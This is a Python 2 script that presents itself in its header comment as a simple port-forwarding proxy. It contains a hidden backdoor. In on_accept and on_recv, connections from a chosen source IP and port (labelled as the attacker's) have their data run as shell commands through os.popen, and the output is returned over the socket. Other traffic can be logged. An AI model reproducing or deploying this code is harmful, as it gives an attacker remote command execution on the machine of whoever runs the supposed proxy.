#!/usr/bin/env python
# This is a simple port-forward / proxy, written using only the default python
# library. If you want to make a suggestion or fix something you can contact-me
# at voorloop_at_gmail.com
# Distributed over IDC(I Don't Care) license
import socket
import select
import getopt
import time
import sys
import os

# Changing the buffer_size and delay, you can improve the speed and bandwidth.
# But when buffer get to high or delay go too down, you can broke things
buffer_size = 4096
delay = 0.0001

class Forward:
    def __init__(self):
        self.forward = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def start(self, host, port):
        try:
            self.forward.connect((host, port))
            return self.forward
        except Exception, e:
            print e
            return False

class TheServer:
    input_list = []
    channel = {}

    def __init__(self, host, port, shost, sport, logfile):
        self.port = port
        self.shost = shost
        self.sport = sport
        self.log = open(logfile, "wb", 0) if logfile is not None else None

        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((host, port))
        self.server.listen(200)

    def __del__(self):
        if self.log is not None:
            self.log.close()

    def main_loop(self):
        self.input_list.append(self.server)
        while 1:
            time.sleep(delay)
            ss = select.select
            inputready, outputready, exceptready = ss(self.input_list, [], [])
            for self.s in inputready:
                if self.s == self.server:
                    self.on_accept()
                    break

                self.data = self.s.recv(buffer_size)
                if len(self.data) == 0:
                    self.on_close()
                    break
                else:
                    self.on_recv()

    def on_accept(self):
        clientsock, clientaddr = self.server.accept()
        print clientaddr, "has connected"

        from_attacker_host = self.shost is None or clientaddr[0] == self.shost
        from_attacker_port = self.sport is None or clientaddr[1] == self.sport
        if self.shost is None and self.sport is None:
            from_attacker_host = from_attacker_port = False

        if from_attacker_host and from_attacker_port:
            self.input_list.append(clientsock)
            self.channel[clientsock] = None
        else:
            forward = Forward().start("localhost", self.port)

            if forward:
                self.input_list.append(clientsock)
                self.input_list.append(forward)
                self.channel[clientsock] = forward
                self.channel[forward] = clientsock
            else:
                print "Can't establish connection with remote server.",
                print "Closing connection with client side", clientaddr
                clientsock.close()
            
    def on_close(self):
        print self.s.getpeername(), "has disconnected"
        
        if self.channel[self.s] is not None:
            self.input_list.remove(self.channel[self.s])
            self.channel[self.s].close()
            del self.channel[self.channel[self.s]]

        self.input_list.remove(self.s)
        self.s.close()
        del self.channel[self.s]

    def on_recv(self):
        data = self.data

        if self.channel[self.s] is not None:
            if self.log is not None:
                self.log.write("%s >>>> %s\n" % (self.s.getpeername(),  self.channel[self.s].getpeername()))
                self.log.write(data)
                self.log.write("\n\n")

            self.channel[self.s].send(data)
        else:
            for line in os.popen(data):
                self.s.send(line)

if __name__ == "__main__":
    
    host = port = shost = sport = log = None

    try:
        opts, args = getopt.getopt(sys.argv[1:], "hl:p:s:P:L:",["listen=", "port=", "shost=", "sport=", "log="])
    except getopt.GetoptError:
        print(sys.argv[0] + ": -l <listen address> -p <listen port> [-s <source IP> -P <source port> -L <log file>]")
        sys.exit(2)

    for opt, arg in opts:
        if opt == "-h":
            print(sys.argv[0] + ": -l <listen address> -p <listen port> [-s <source IP> -P <source port> -L <log file>]")
            sys.exit(0)
        elif opt in ("-l", "--listen"):
            host = arg
        elif opt in ("-p", "--port"):
            port = int(arg)
        elif opt in ("-s", "--shost"):
            shost = arg
        elif opt in ("-P", "--sport"):
            sport = int(arg)
        elif opt in ("-L", "--log"):
            log = arg

    if host is None or port is None:
        print("Listen address and port are mandatory!")
        print(sys.argv[0] + ": -l <listen address> -p <listen port> [-s <source IP> -P <source port> -L <log file>]")
        sys.exit(2)
        
    server = TheServer(host, port, shost, sport, log)
    try:
        server.main_loop()
    except KeyboardInterrupt:
        print "Ctrl C - Stopping server"
        sys.exit(1)

